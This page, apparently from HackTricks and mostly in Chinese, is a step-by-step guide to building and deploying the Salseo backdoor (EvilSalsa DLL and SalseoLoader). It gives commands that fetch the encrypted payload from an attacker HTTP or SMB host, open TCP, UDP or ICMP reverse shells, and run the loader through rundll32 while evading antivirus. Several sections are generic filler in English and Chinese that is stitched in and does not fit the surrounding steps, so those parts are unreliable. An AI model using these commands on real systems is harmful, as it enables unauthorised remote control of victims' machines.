# Salseo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 编译二进制文件

从github下载源代码并编译**EvilSalsa**和**SalseoLoader**。你需要安装**Visual Studio**来编译代码。

将这些项目编译为你将要使用它们的Windows系统的架构（如果Windows支持x64，则编译为该架构）。

你可以在Visual Studio中的**左侧"Build"选项卡**中选择架构，在**"Platform Target"**中。

(\*\*如果你找不到这些选项，请点击**"Project Tab"**，然后点击**"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

然后，构建这两个项目（Build -> Build Solution）（在日志中将显示可执行文件的路径）：

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## 准备后门

首先，你需要对**EvilSalsa.dll**进行编码。你可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**来进行编码：

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo

##### Salseo - Backdoor

###### Salseo - Persistence

Salseo is a backdoor technique that allows an attacker to maintain access to a compromised Windows system. It achieves persistence by creating a new service or modifying an existing one to execute malicious code each time the system starts.

###### Salseo - Privilege Escalation

Salseo can also be used to escalate privileges on a compromised Windows system. By exploiting vulnerabilities or misconfigurations, an attacker can gain higher privileges and access sensitive information or perform unauthorized actions.

##### Salseo - Remote Access

Salseo can provide remote access to a compromised Windows system, allowing an attacker to control the system from a remote location. This can be achieved by creating a reverse shell or by using a remote administration tool (RAT) to establish a connection with the compromised system.

##### Salseo - Data Exfiltration

Salseo can be used to exfiltrate data from a compromised Windows system. An attacker can use various techniques, such as uploading files to a remote server, sending data through a covert channel, or using a command and control (C2) server to retrieve sensitive information.

##### Salseo - Anti-Forensics

Salseo can employ anti-forensic techniques to evade detection and hinder forensic analysis. This can include deleting logs, modifying timestamps, encrypting data, or using steganography to hide information within innocent-looking files.

##### Salseo - Countermeasures

To defend against Salseo attacks, it is important to implement strong security measures. This includes keeping systems and software up to date, using strong passwords, monitoring network traffic for suspicious activity, and regularly conducting security audits and penetration testing. Additionally, employing endpoint protection solutions and intrusion detection systems can help detect and mitigate Salseo attacks.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
好的，现在你已经拥有执行所有Salseo操作所需的一切：**编码的EvilDalsa.dll**和**SalseoLoader的二进制文件**。

**将SalseoLoader.exe二进制文件上传到目标机器。它们不应该被任何杀毒软件检测到...**

## **执行后门**

### **获取TCP反向Shell（通过HTTP下载编码的dll）**

记得启动一个nc作为反向Shell监听器，并启动一个HTTP服务器来提供编码的evilsalsa。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **获取UDP反向Shell（通过SMB下载编码的dll）**

记得启动一个nc作为反向Shell监听器，并启动一个SMB服务器来提供编码的evilsalsa（impacket-smbserver）。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **获取ICMP反向shell（已在受害者内部编码的dll）**

**这次你需要在客户端上使用一个特殊工具来接收反向shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **禁用ICMP回复：**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### 执行客户端：

To execute the client, you need to follow these steps:

1. Compile the client code into an executable file.
2. Transfer the executable file to the target machine.
3. Run the executable file on the target machine.

Here is a detailed explanation of each step:

1. **Compile the client code into an executable file**: Use a compiler or an integrated development environment (IDE) to compile the client code into an executable file. Make sure to choose the appropriate compiler or IDE based on the programming language used to develop the client.

2. **Transfer the executable file to the target machine**: Use a secure file transfer method, such as Secure Copy Protocol (SCP) or File Transfer Protocol (FTP), to transfer the compiled executable file to the target machine. Ensure that you have the necessary permissions and access to the target machine.

3. **Run the executable file on the target machine**: Once the executable file is transferred to the target machine, navigate to the directory where the file is located using the command line interface. Then, execute the file by running the appropriate command based on the operating system and file type. For example, on Windows, you can use the `start` command followed by the file name, while on Linux, you can use the `./` prefix followed by the file name.

By following these steps, you will be able to successfully execute the client on the target machine.
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 在受害者内部，让我们执行salseo操作：
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## 将SalseoLoader编译为导出主函数的DLL

使用Visual Studio打开SalseoLoader项目。

### 在主函数之前添加：\[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1).png>)

### 为该项目安装DllExport

#### **工具** --> **NuGet程序包管理器** --> **管理解决方案的NuGet程序包...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)

#### **搜索DllExport包（使用浏览选项卡），然后点击安装（并接受弹出窗口）**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)

在项目文件夹中会出现以下文件：**DllExport.bat**和**DllExport\_Configure.bat**

### **卸载** DllExport

点击**卸载**（是的，很奇怪，但相信我，这是必要的）

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **退出Visual Studio并执行DllExport\_configure**

只需**退出**Visual Studio

然后，转到**SalseoLoader文件夹**并**执行DllExport\_Configure.bat**

选择**x64**（如果您将在x64系统中使用它，这是我的情况），选择**System.Runtime.InteropServices**（在**DllExport的命名空间**中）并点击**应用**

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### **再次使用Visual Studio打开项目**

**\[DllExport]**不再被标记为错误

![](<../.gitbook/assets/image (8) (1).png>)

### 构建解决方案

选择**输出类型=类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型=类库）

![](<../.gitbook/assets/image (10) (1).png>)

选择**x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标=x64）

![](<../.gitbook/assets/image (9) (1) (1).png>)

要**构建**解决方案：构建 --> 构建解决方案（在输出控制台中将显示新DLL的路径）

### 测试生成的DLL

将DLL复制并粘贴到要测试的位置。

执行：
```
rundll32.exe SalseoLoader.dll,main
```
如果没有出现错误，那么你可能有一个功能正常的DLL！！

## 使用DLL获取shell

不要忘记使用一个**HTTP** **服务器**并设置一个**nc** **监听器**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD（命令提示符）是Windows操作系统中的命令行工具。它允许用户通过键入命令来与操作系统进行交互。CMD提供了许多内置命令和功能，可以用于执行各种任务，如文件和文件夹操作、网络配置、进程管理等。

#### 常用CMD命令

以下是一些常用的CMD命令：

- `dir`：列出当前目录中的文件和文件夹。
- `cd`：更改当前目录。
- `mkdir`：创建新的文件夹。
- `del`：删除文件。
- `copy`：复制文件。
- `ipconfig`：显示网络配置信息。
- `tasklist`：显示当前运行的进程列表。
- `ping`：测试与另一个主机的连接。
- `shutdown`：关闭计算机。

#### CMD后门

CMD后门是一种通过操纵CMD命令行工具来实现远程访问和控制目标计算机的方法。攻击者可以使用CMD后门来执行恶意操作，如窃取敏感信息、操纵文件和文件夹、执行远程命令等。

以下是一些常见的CMD后门技术：

- `netcat`：使用Netcat工具在目标计算机上监听端口，以便远程访问和控制。
- `psexec`：使用PsExec工具在目标计算机上执行远程命令。
- `wmic`：使用Windows Management Instrumentation Command-line（WMIC）工具执行远程管理任务。
- `regsvr32`：使用Regsvr32工具加载恶意DLL文件并执行远程命令。

#### 防御措施

为了防止CMD后门攻击，可以采取以下措施：

- 定期更新操作系统和安全补丁，以修复已知的漏洞。
- 使用防火墙和入侵检测系统来监控网络流量和检测异常行为。
- 限制对CMD工具的访问权限，只允许授权用户使用。
- 使用强密码和多因素身份验证来保护管理员账户。
- 定期审查系统日志，以便及时发现异常活动。
- 使用安全软件和反恶意软件工具来检测和清除潜在的后门。

#### 总结

CMD是Windows操作系统中的命令行工具，可用于执行各种任务。然而，CMD后门是一种潜在的安全威胁，攻击者可以利用它来远程访问和控制目标计算机。为了保护系统安全，需要采取适当的防御措施来防止CMD后门攻击。
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？想要在 HackTricks 中 **宣传你的公司** 吗？或者你想要获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass)，或者在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
